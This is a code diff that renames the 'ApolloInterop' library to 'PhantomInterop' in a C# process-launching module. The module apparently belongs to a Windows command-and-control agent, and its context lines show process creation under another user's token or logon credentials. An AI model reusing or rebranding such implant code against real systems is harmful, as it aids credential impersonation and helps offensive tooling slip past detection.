@@ -1,9 +1,9 @@
 ﻿//#define SERVER2012_COMPATIBLE
 
-using ApolloInterop.Classes.Api;
-using ApolloInterop.Classes.Events;
-using ApolloInterop.Interfaces;
-using ApolloInterop.Structs.ApolloStructs;
+using PhantomInterop.Classes.Api;
+using PhantomInterop.Classes.Events;
+using PhantomInterop.Interfaces;
+using PhantomInterop.Structs.PhantomStructs;
 using Microsoft.Win32.SafeHandles;
 using System;
 using System.Collections.Generic;
@@ -13,13 +13,13 @@ using System.Runtime.InteropServices;
 using System.Security.Principal;
 using System.Threading;
 using System.Threading.Tasks;
-using ApolloInterop.Features.WindowsTypesAndAPIs;
-using ApolloInterop.Structs;
-using ApolloInterop.Structs.MythicStructs;
-using ApolloInterop.Utils;
-using static ApolloInterop.Enums.Win32;
-using static ApolloInterop.Structs.Win32;
-using AI = ApolloInterop.Classes.Core;
+using PhantomInterop.Features.WindowsTypesAndAPIs;
+using PhantomInterop.Structs;
+using PhantomInterop.Structs.MythicStructs;
+using PhantomInterop.Utils;
+using static PhantomInterop.Enums.Win32;
+using static PhantomInterop.Structs.Win32;
+using AI = PhantomInterop.Classes.Core;
 
 namespace Process
 {
@@ -718,7 +718,7 @@ namespace Process
             });
         }
 
-        public override bool StartWithCredentials(ApolloLogonInformation logonInfo)
+        public override bool StartWithCredentials(PhantomLogonInformation logonInfo)
         {
             bool bRet = false;
             IntPtr hToken = IntPtr.Zero;
@@ -805,7 +805,7 @@ namespace Process
 
                     if (!bRet && (dwError == 1314))
                     {
-                        if (_agent.GetIdentityManager().GetCurrentLogonInformation(out ApolloLogonInformation cred))
+                        if (_agent.GetIdentityManager().GetCurrentLogonInformation(out PhantomLogonInformation cred))
                         {
                             DebugHelp.DebugWriteLine("Failed to create process with token. Attempting to create process with logon.");
                             bRet = _pCreateProcessWithLogonW(
